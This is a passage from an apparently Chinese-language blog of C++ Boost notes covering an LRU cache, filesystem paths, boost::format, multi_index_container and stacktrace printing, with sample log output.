&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">clear</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        m_map.<span class="built_in">clear</span>();</span><br><span class="line">        m_list.<span class="built_in">clear</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">evict</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// evict item from the end of most recently used list</span></span><br><span class="line">        <span class="keyword">typename</span> list_type::iterator i = --m_list.<span class="built_in">end</span>();</span><br><span class="line">        m_map.<span class="built_in">erase</span>(*i);</span><br><span class="line">        m_list.<span class="built_in">erase</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    map_type m_map;</span><br><span class="line">    list_type m_list;</span><br><span class="line">    <span class="type">size_t</span> m_capacity;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="2-使用说明"><a href="#2-使用说明" class="headerlink" title="2. 使用说明"></a>2. 使用说明</h3><ul>
<li>insert只能首次插入key，已存在的key调用insert会没有任何效果</li>
<li>get返回的不是value，而是<code>boost::optional</code>，需要使用其再次调用get才能返回value<ul>
<li>get不存在的key将返回<code>boost::none</code>，如果对其调用get会直接抛异常</li>
</ul>
</li>
<li>get会将对应的key放到最前面，但get出来的值是一个右值，修改不会影响lru中的value</li>
<li>contains不会影响顺序</li>
</ul>
<h2 id="boost-filesystem-path-hpp"><a href="#boost-filesystem-path-hpp" class="headerlink" title="boost&#x2F;filesystem&#x2F;path.hpp"></a>boost&#x2F;filesystem&#x2F;path.hpp</h2><h3 id="1-路径字符串操作"><a href="#1-路径字符串操作" class="headerlink" title="1. 路径字符串操作"></a>1. 路径字符串操作</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;boost/filesystem/path.hpp&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argC, <span class="type">char</span> *argV[])</span> </span>&#123;</span><br><span class="line">    std::string test = <span class="string">&quot;C:\\ww\\asdf asdf\\aaa.txt&quot;</span>;</span><br><span class="line">    boost::<span class="function">filesystem::path <span class="title">p</span><span class="params">(test)</span></span>;</span><br><span class="line">    <span class="built_in">LOG_INFO</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, p.<span class="built_in">filename</span>().<span class="built_in">string</span>());      <span class="comment">// aaa.txt</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="boost-format-hpp"><a href="#boost-format-hpp" class="headerlink" title="boost&#x2F;format.hpp"></a>boost&#x2F;format.hpp</h2><h3 id="1-拼接变量到字符串"><a href="#1-拼接变量到字符串" class="headerlink" title="1. 拼接变量到字符串"></a>1. 拼接变量到字符串</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;boost/format.hpp&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> std::string <span class="title">to_string</span><span class="params">(<span class="type">const</span> RunLoopCB&amp; cb)</span> </span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *jsonFormat = <span class="string">R&quot;(&#123;&quot;fileName&quot;:&quot;%1%&quot;,&quot;callThead&quot;:&quot;%2%&quot;,&quot;calleeName&quot;:&quot;%3%&quot;,&quot;funcName&quot;:&quot;%4%&quot;,&quot;calleeLineNum&quot;:%5%&#125;)&quot;</span>;</span><br><span class="line">    boost::format fmt = boost::format(jsonFormat)</span><br><span class="line">        % cb.fileName</span><br><span class="line">        % cb.callTid</span><br><span class="line">        % cb.calleeName</span><br><span class="line">        % cb.funcName</span><br><span class="line">        % cb.calleeLineNum;</span><br><span class="line">    <span class="keyword">return</span> fmt.<span class="built_in">str</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="boost-multi-index-container-hpp"><a href="#boost-multi-index-container-hpp" class="headerlink" title="boost&#x2F;multi_index_container.hpp"></a>boost&#x2F;multi_index_container.hpp</h2><h3 id="1-多重索引表"><a href="#1-多重索引表" class="headerlink" title="1. 多重索引表"></a>1. 多重索引表</h3><ul>
<li>可以看作是数据库在内存中的映射，可以堆一个数据结构建立多个不同的索引，查找时更加方便</li>
<li>暂时没找到主次排序字段怎么定义，只能使用主排序</li>
<li>关键key也可以使用自定义类型，但是要实现<code>&gt;=</code>、<code>&lt;=</code>、<code>&gt;</code>、<code>&lt;</code>、<code>==</code>、<code>!=</code>这些运算符</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;boost/multi_index/key_extractors.hpp&gt;</span>     <span class="comment">// boost::multi_index::member</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;boost/multi_index/ordered_index.hpp&gt;</span>      <span class="comment">// boost::multi_index::ordered_unique 和 boost::multi_index::ordered_non_unique</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;boost/multi_index_container.hpp&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    std::string name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> std &#123;</span><br><span class="line"><span class="function">string <span class="title">to_string</span><span class="params">(<span class="type">const</span> Student &amp;stu)</span> </span>&#123;</span><br><span class="line">    stringstream ss;</span><br><span class="line">    ss &lt;&lt; <span class="string">&quot;&#123;&quot;</span>;</span><br><span class="line">    ss &lt;&lt; <span class="string">R&quot;(&quot;id&quot;:)&quot;</span> &lt;&lt; stu.id;</span><br><span class="line">    ss &lt;&lt; <span class="string">R&quot;(,&quot;name&quot;:&quot;)&quot;</span> &lt;&lt; stu.name &lt;&lt; <span class="string">&quot;\&quot;&quot;</span>;</span><br><span class="line">    ss &lt;&lt; <span class="string">R&quot;(,&quot;age&quot;:&quot;)&quot;</span> &lt;&lt; stu.age;</span><br><span class="line">    ss &lt;&lt; <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> ss.<span class="built_in">str</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;  <span class="comment">// namespace std</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 下面的定义是为了获取tag，类似map的key</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">tagID</span> &#123;&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">tagName</span> &#123;&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">tagAge</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> StudentMap = boost::multi_index_container&lt;</span><br><span class="line">    Student,</span><br><span class="line">    boost::multi_index::indexed_by&lt;</span><br><span class="line">        <span class="comment">// 学号为唯一key</span></span><br><span class="line">        boost::multi_index::ordered_unique&lt;boost::multi_index::tag&lt;tagID&gt;,</span><br><span class="line">                                           boost::multi_index::member&lt;Student, <span class="type">int</span>, &amp;Student::id&gt;&gt;,</span><br><span class="line">        <span class="comment">// 名称可以不唯一，但是要有序</span></span><br><span class="line">        boost::multi_index::ordered_non_unique&lt;boost::multi_index::tag&lt;tagName&gt;,</span><br><span class="line">                                               boost::multi_index::member&lt;Student, std::string, &amp;Student::name&gt;&gt;,</span><br><span class="line">        <span class="comment">// 年龄同上</span></span><br><span class="line">        boost::multi_index::ordered_non_unique&lt;boost::multi_index::tag&lt;tagAge&gt;,</span><br><span class="line">                                               boost::multi_index::member&lt;Student, <span class="type">int</span>, &amp;Student::age&gt;&gt;&gt;&gt;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 获取名称排序</span></span><br><span class="line">    <span class="keyword">auto</span> &amp;studentsName = students.<span class="built_in">get</span>&lt;tagName&gt;();  <span class="comment">// 这里必须用引用</span></span><br><span class="line">    <span class="comment">// 查找，根据名称查找，但是不确定查到的是两个同名的哪一个</span></span><br><span class="line">    <span class="keyword">auto</span> iterName = studentsName.<span class="built_in">find</span>(<span class="string">&quot;bbd&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (iterName != studentsName.<span class="built_in">end</span>()) &#123;</span><br><span class="line">        <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;find student &#123;&#125;&quot;</span>, std::<span class="built_in">to_string</span>(*iterName)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 查找名叫bbd的下界，第一个等于bbd的</span></span><br><span class="line">    iterName = studentsName.<span class="built_in">lower_bound</span>(<span class="string">&quot;bbd&quot;</span>);</span><br><span class="line">    <span class="comment">// 查找名叫bbd的上界，不等于bbd</span></span><br><span class="line">    <span class="keyword">auto</span> iterNameEnd = studentsName.<span class="built_in">upper_bound</span>(<span class="string">&quot;bbd&quot;</span>);</span><br><span class="line">    <span class="comment">// 遍历输出所有bbd学生信息</span></span><br><span class="line">    <span class="keyword">while</span> (iterName != iterNameEnd) &#123;</span><br><span class="line">        <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;bbd student &#123;&#125;&quot;</span>, std::<span class="built_in">to_string</span>(*iterName)));</span><br><span class="line">        ++iterName;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 删除</span></span><br><span class="line">    iterName = studentsName.<span class="built_in">find</span>(<span class="string">&quot;bbd&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (iterName != studentsName.<span class="built_in">end</span>()) &#123;</span><br><span class="line">        <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;delete student &#123;&#125;&quot;</span>, std::<span class="built_in">to_string</span>(*iterName)));</span><br><span class="line">        studentsName.<span class="built_in">erase</span>(iterName);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 遍历</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> iter = studentsName.<span class="built_in">begin</span>(); iter != studentsName.<span class="built_in">end</span>(); ++iter) &#123;</span><br><span class="line">        <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, std::<span class="built_in">to_string</span>(*iter)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改map，学生bbd改名字了，需要先找到学生的迭代器才能修改</span></span><br><span class="line">    iterName = studentsName.<span class="built_in">find</span>(<span class="string">&quot;bbd&quot;</span>);</span><br><span class="line">    <span class="comment">// modify的回调是在更新索引前调用的，根据回调修改的内容进行更新索引</span></span><br><span class="line">    ret = studentsName.<span class="built_in">modify</span>(iterName, [](Student &amp;stu) &#123; stu.name = <span class="string">&quot;cbd&quot;</span>; &#125;);  <span class="comment">// 更改成功</span></span><br><span class="line">    <span class="comment">// 如果modify改动把主索引重复了，就会删除当前修改的迭代器，更改会失败</span></span><br><span class="line">    <span class="comment">// 更新学生学号和zbd一样，当前更新信息的学生被删除</span></span><br><span class="line">    <span class="keyword">auto</span> stu = *iterName;</span><br><span class="line">    ret = studentsName.<span class="built_in">modify</span>(iterName, [](Student &amp;stu) &#123; stu.id = <span class="number">3</span>; &#125;);  <span class="comment">// 更改失败</span></span><br><span class="line">    <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;update student &#123;&#125; ret &#123;&#125;&quot;</span>, std::<span class="built_in">to_string</span>(stu), ret));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> iter = studentsName.<span class="built_in">begin</span>(); iter != studentsName.<span class="built_in">end</span>(); ++iter) &#123;</span><br><span class="line">        <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, std::<span class="built_in">to_string</span>(*iter)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="boost-stacktrace-hpp"><a href="#boost-stacktrace-hpp" class="headerlink" title="boost&#x2F;stacktrace.hpp"></a>boost&#x2F;stacktrace.hpp</h2><h3 id="1-打印堆栈信息"><a href="#1-打印堆栈信息" class="headerlink" title="1. 打印堆栈信息"></a>1. 打印堆栈信息</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">m_future = std::<span class="built_in">async</span>(std::launch::async, [<span class="keyword">this</span>]() &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        boost::asio::io_context::work <span class="built_in">work</span>(*m_pIOContext);</span><br><span class="line">        m_pIOContext-&gt;<span class="built_in">run</span>();</span><br><span class="line">    &#125; <span class="built_in">catch</span> (...) &#123;</span><br><span class="line">        std::stringstream ss;</span><br><span class="line">        ss &lt;&lt; boost::stacktrace::<span class="built_in">stacktrace</span>();</span><br><span class="line">        <span class="keyword">auto</span> error = boost::<span class="built_in">current_exception_diagnostic_information</span>();</span><br><span class="line">        <span class="keyword">auto</span> stack = ss.<span class="built_in">str</span>();</span><br><span class="line">        <span class="built_in">LOGE</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;thread exit with exception&quot;</span>), <span class="built_in">REASON</span>(<span class="string">&quot;error &#123;&#125;, stack \n&#123;&#125;&quot;</span>, error, stack),</span><br><span class="line">                <span class="built_in">WILL</span>(<span class="string">&quot;thread exit&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>效果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2022-08-16 10:49:46 [237723:237724][E][main.cpp:71 operator()] thread exit with exception; Reason: error Dynamic exception type: int, stack</span><br><span class="line"> 0# 0x000055B4979DD01C in build/output/run</span><br><span class="line"> 1# 0x000055B4979F81D8 in build/output/run</span><br><span class="line"> 2# 0x000055B4979F819B in build/output/run</span><br><span class="line"> 3# 0x000055B4979F813A in build/output/run</span><br><span class="line"> 4# 0x000055B4979F80CC in build/output/run</span><br><span class="line"> 5# 0x000055B4979F7DAC in build/output/run</span><br><span class="line"> 6# 0x000055B4979F77A3 in build/output/run</span><br><span class="line"> 7# 0x000055B4979F7101 in build/output/run</span><br><span class="line"> 8# 0x000055B4979F65D6 in build/output/run</span><br><span class="line"> 9# 0x000055B4979DFD9C in build/output/run</span><br><span class="line">10# 0x000055B4979DB1B8 in build/output/run</span><br><span class="line">11# 0x000055B4979E6D27 in build/output/run</span><br><span class="line">12# 0x000055B4979E319F in build/output/run</span><br><span class="line">13# 0x000055B4979DFB56 in build/output/run</span><br><span class="line">14# 0x000055B4979E31CB in build/output/run</span><br><span class="line">15# 0x000055B4979E31DC in build/output/run</span><br><span class="line">16# 0x00007F36189BC717 in /usr/lib/libc.so.6</span><br><span class="line">17# 0x000055B4979D032A in build/output/run</span><br><span class="line">18# 0x000055B4979DFBD7 in build/output/run</span><br><span class="line">19# 0x000055B4979DAF97 in build/output/run</span><br><span class="line">20# 0x000055B4979F3FC8 in build/output/run</span><br><span class="line">21# 0x000055B4979FA812 in build/output/run</span><br><span class="line">22# 0x000055B4979FA497 in build/output/run</span><br><span class="line">23# 0x000055B4979FA167 in build/output/run</span><br><span class="line">24# 0x000055B4979F9AC2 in build/output/run</span><br><span class="line">25# 0x000055B4979F855E in build/output/run</span><br><span class="line">26# 0x00007F3618CD62F3 in /usr/lib/libstdc++.so.6</span><br><span class="line">27# 0x00007F36189B778D in /usr/lib/libc.so.6</span><br><span class="line">28# __clone in /usr/lib/libc.so.6</span><br><span class="line">; Will: thread exit</span><br></pre></td></tr></table></figure>

<h3 id="2-打印带函数和行号的堆栈信息"><a href="#2-打印带函数和行号的堆栈信息" class="headerlink" title="2. 打印带函数和行号的堆栈信息"></a>2. 打印带函数和行号的堆栈信息</h3><ul>
<li>需要在cmake里面添加<code>backtrace</code>的链接库和<code>BOOST_STACKTRACE_USE_BACKTRACE</code>的宏</li>
<li>需要系统中存在<code>libbacktrace.so</code>，不存在就百度找办法安装</li>
</ul>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">target_link_libraries</span>(</span><br><span class="line">    <span class="variable">$&#123;BIN_NAME&#125;</span> PRIVATE</span><br><span class="line">    backtrace</span><br><span class="line">)</span><br><span class="line"><span class="keyword">target_compile_definitions</span>(<span class="variable">$&#123;BIN_NAME&#125;</span> PRIVATE</span><br><span class="line">    BOOST_STACKTRACE_USE_BACKTRACE</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>效果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2022-08-16 10:52:29 [242804:242805][E][main.cpp:71 operator()] thread exit with exception; Reason: error Dynamic exception type: int, stack</span><br><span class="line"> 0# Test::Test()::&#123;lambda()#1&#125;::operator()() const at /home/test/src/app/main.cpp:68</span><br><span class="line"> 1# void std::__invoke_impl&lt;void, Test::Test()::&#123;lambda()#1&#125;&gt;(std::__invoke_other, Test::Test()::&#123;lambda()#1&#125;&amp;&amp;) in build/output/run</span><br><span class="line"> 2# std::__invoke_result&lt;Test::Test()::&#123;lambda()#1&#125;&gt;::type std::__invoke&lt;Test::Test()::&#123;lambda()#1&#125;&gt;(Test::Test()::&#123;lambda()#1&#125;&amp;&amp;) in build/output/run</span><br><span class="line"> 3# void std::thread::_Invoker&lt;std::tuple&lt;Test::Test()::&#123;lambda()#1&#125;&gt; &gt;::_M_invoke&lt;0ul&gt;(std::_Index_tuple&lt;0ul&gt;) in build/output/run</span><br><span class="line"> 4# std::thread::_Invoker&lt;std::tuple&lt;Test::Test()::&#123;lambda()#1&#125;&gt; &gt;::operator()() in build/output/run</span><br><span class="line"> 5# std::__future_base::_Task_setter&lt;std::unique_ptr&lt;std::__future_base::_Result&lt;void&gt;, std::__future_base::_Result_base::_Deleter&gt;, std::thread::_Invoker&lt;std::tuple&lt;Test::Test()::&#123;lambda()#1&#125;&gt; &gt;, void&gt;::operator()() const in build/output/run</span><br><span class="line"> 6# std::unique_ptr&lt;std::__future_base::_Result&lt;void&gt;, std::__future_base::_Result_base::_Deleter&gt; std::__invoke_impl&lt;std::unique_ptr&lt;std::__future_base::_Result&lt;void&gt;, std::__future_base::_Result_base::_Deleter&gt;, std::__future_base::_Task_setter&lt;std::unique_ptr&lt;std::__future_base::_Result&lt;void&gt;, std::__future_base::_Result_base::_Deleter&gt;, std::thread::_Invoker&lt;std::tuple&lt;Test::Test()::&#123;lambda()#1&#125;&gt; &gt;, void&gt;&amp;&gt;(std::__invoke_other, std::__future_base::_Task_setter&lt;std::unique_ptr&lt;std::__future_base::_Result&lt;void&gt;, std::__future_base::_Result_base::_Deleter&gt;, std::thread::_Invoker&lt;std::tuple&lt;Test::Test()::&#123;lambda()#1&#125;&gt; &gt;, void&gt;&amp;) in build/output/run</span><br><span class="line"> 7# std::enable_if&lt;is_invocable_r_v&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt;, std::__future_base::_Task_setter&lt;std::unique_ptr&lt;std::__future_base::_Result&lt;void&gt;, std::__future_base::_Result_base::_Deleter&gt;, std::thread::_Invoker&lt;std::tuple&lt;Test::Test()::&#123;lambda()#1&#125;&gt; &gt;, void&gt;&amp;&gt;, std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; &gt;::type std::__invoke_r&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt;, std::__future_base::_Task_setter&lt;std::unique_ptr&lt;std::__future_base::_Result&lt;void&gt;, std::__future_base::_Result_base::_Deleter&gt;, std::thread::_Invoker&lt;std::tuple&lt;Test::Test()::&#123;lambda()#1&#125;&gt; &gt;, void&gt;&amp;&gt;(std::__future_base::_Task_setter&lt;std::unique_ptr&lt;std::__future_base::_Result&lt;void&gt;, std::__future_base::_Result_base::_Deleter&gt;, std::thread::_Invoker&lt;std::tuple&lt;Test::Test()::&#123;lambda()#1&#125;&gt; &gt;, void&gt;&amp;) in build/output/run</span><br><span class="line"> 8# std::_Function_handler&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; (), std::__future_base::_Task_setter&lt;std::unique_ptr&lt;std::__future_base::_Result&lt;void&gt;, std::__future_base::_Result_base::_Deleter&gt;, std::thread::_Invoker&lt;std::tuple&lt;Test::Test()::&#123;lambda()#1&#125;&gt; &gt;, void&gt; &gt;::_M_invoke(std::_Any_data const&amp;) in build/output/run</span><br><span class="line"> 9# std::function&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; ()&gt;::operator()() const in build/output/run</span><br><span class="line">10# std::__future_base::_State_baseV2::_M_do_set(std::function&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; ()&gt;*, bool*) in build/output/run</span><br><span class="line">11# void std::__invoke_impl&lt;void, void (std::__future_base::_State_baseV2::*)(std::function&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; ()&gt;*, bool*), std::__future_base::_State_baseV2*, std::function&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; ()&gt;*, bool*&gt;(std::__invoke_memfun_deref, void (std::__future_base::_State_baseV2::*&amp;&amp;)(std::function&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; ()&gt;*, bool*), std::__future_base::_State_baseV2*&amp;&amp;, std::function&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; ()&gt;*&amp;&amp;, bool*&amp;&amp;) at /usr/include/c++/12.1.1/bits/invoke.h:74</span><br><span class="line">12# std::__invoke_result&lt;void (std::__future_base::_State_baseV2::*)(std::function&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; ()&gt;*, bool*), std::__future_base::_State_baseV2*, std::function&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; ()&gt;*, bool*&gt;::type std::__invoke&lt;void (std::__future_base::_State_baseV2::*)(std::function&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; ()&gt;*, bool*), std::__future_base::_State_baseV2*, std::function&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; ()&gt;*, bool*&gt;(void (std::__future_base::_State_baseV2::*&amp;&amp;)(std::function&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; ()&gt;*, bool*), std::__future_base::_State_baseV2*&amp;&amp;, std::function&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; ()&gt;*&amp;&amp;, bool*&amp;&amp;) in build/output/run</span><br><span class="line">13# std::call_once&lt;void (std::__future_base::_State_baseV2::*)(std::function&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; ()&gt;*, bool*), std::__future_base::_State_baseV2*, std::function&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; ()&gt;*, bool*&gt;(std::once_flag&amp;, void (std::__future_base::_State_baseV2::*&amp;&amp;)(std::function&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; ()&gt;*, bool*), std::__future_base::_State_baseV2*&amp;&amp;, std::function&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; ()&gt;*&amp;&amp;, bool*&amp;&amp;)::&#123;lambda()#1&#125;::operator()() const in build/output/run</span><br><span class="line">14# std::once_flag::_Prepare_execution::_Prepare_execution&lt;std::call_once&lt;void (std::__future_base::_State_baseV2::*)(std::function&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; ()&gt;*, bool*), std::__future_base::_State_baseV2*, std::function&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; ()&gt;*, bool*&gt;(std::once_flag&amp;, void (std::__future_base::_State_baseV2::*&amp;&amp;)(std::function&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; ()&gt;*, bool*), std::__future_base::_State_baseV2*&amp;&amp;, std::function&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; ()&gt;*&amp;&amp;, bool*&amp;&amp;)::&#123;lambda()#1&#125;&gt;(void (std::__future_base::_State_baseV2::*&amp;)(std::function&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; ()&gt;*, bool*))::&#123;lambda()#1&#125;::operator()() const in build/output/run</span><br><span class="line">15# std::once_flag::_Prepare_execution::_Prepare_execution&lt;std::call_once&lt;void (std::__future_base::_State_baseV2::*)(std::function&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; ()&gt;*, bool*), std::__future_base::_State_baseV2*, std::function&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; ()&gt;*, bool*&gt;(std::once_flag&amp;, void (std::__future_base::_State_baseV2::*&amp;&amp;)(std::function&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; ()&gt;*, bool*), std::__future_base::_State_baseV2*&amp;&amp;, std::function&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; ()&gt;*&amp;&amp;, bool*&amp;&amp;)::&#123;lambda()#1&#125;&gt;(void (std::__future_base::_State_baseV2::*&amp;)(std::function&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; ()&gt;*, bool*))::&#123;lambda()#1&#125;::_FUN() in build/output/run</span><br><span class="line">16# 0x00007FF52BDBC717 in /usr/lib/libc.so.6</span><br><span class="line">17# __gthread_once(int*, void (*)()) at /usr/include/c++/12.1.1/x86_64-pc-linux-gnu/bits/gthr-default.h:700</span><br><span class="line">18# void std::call_once&lt;void (std::__future_base::_State_baseV2::*)(std::function&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; ()&gt;*, bool*), std::__future_base::_State_baseV2*, std::function&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; ()&gt;*, bool*&gt;(std::once_flag&amp;, void (std::__future_base::_State_baseV2::*&amp;&amp;)(std::function&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; ()&gt;*, bool*), std::__future_base::_State_baseV2*&amp;&amp;, std::function&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; ()&gt;*&amp;&amp;, bool*&amp;&amp;) in build/output/run</span><br><span class="line">19# std::__future_base::_State_baseV2::_M_set_result(std::function&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; ()&gt;, bool) in build/output/run</span><br><span class="line">20# std::__future_base::_Async_state_impl&lt;std::thread::_Invoker&lt;std::tuple&lt;Test::Test()::&#123;lambda()#1&#125;&gt; &gt;, void&gt;::_M_run() in build/output/run</span><br><span class="line">21# void std::__invoke_impl&lt;void, void (std::__future_base::_Async_state_impl&lt;std::thread::_Invoker&lt;std::tuple&lt;Test::Test()::&#123;lambda()#1&#125;&gt; &gt;, void&gt;::*)(), std::__future_base::_Async_state_impl&lt;std::thread::_Invoker&lt;std::tuple&lt;Test::Test()::&#123;lambda()#1&#125;&gt; &gt;, void&gt;*&gt;(std::__invoke_memfun_deref, void (std::__future_base::_Async_state_impl&lt;std::thread::_Invoker&lt;std::tuple&lt;Test::Test()::&#123;lambda()#1&#125;&gt; &gt;, void&gt;::*&amp;&amp;)(), std::__future_base::_Async_state_impl&lt;std::thread::_Invoker&lt;std::tuple&lt;Test::Test()::&#123;lambda()#1&#125;&gt; &gt;, void&gt;*&amp;&amp;) at /usr/include/c++/12.1.1/bits/invoke.h:74</span><br><span class="line">22# std::__invoke_result&lt;void (std::__future_base::_Async_state_impl&lt;std::thread::_Invoker&lt;std::tuple&lt;Test::Test()::&#123;lambda()#1&#125;&gt; &gt;, void&gt;::*)(), std::__future_base::_Async_state_impl&lt;std::thread::_Invoker&lt;std::tuple&lt;Test::Test()::&#123;lambda()#1&#125;&gt; &gt;, void&gt;*&gt;::type std::__invoke&lt;void (std::__future_base::_Async_state_impl&lt;std::thread::_Invoker&lt;std::tuple&lt;Test::Test()::&#123;lambda()#1&#125;&gt; &gt;, void&gt;::*)(), std::__future_base::_Async_state_impl&lt;std::thread::_Invoker&lt;std::tuple&lt;Test::Test()::&#123;lambda()#1&#125;&gt; &gt;, void&gt;*&gt;(void 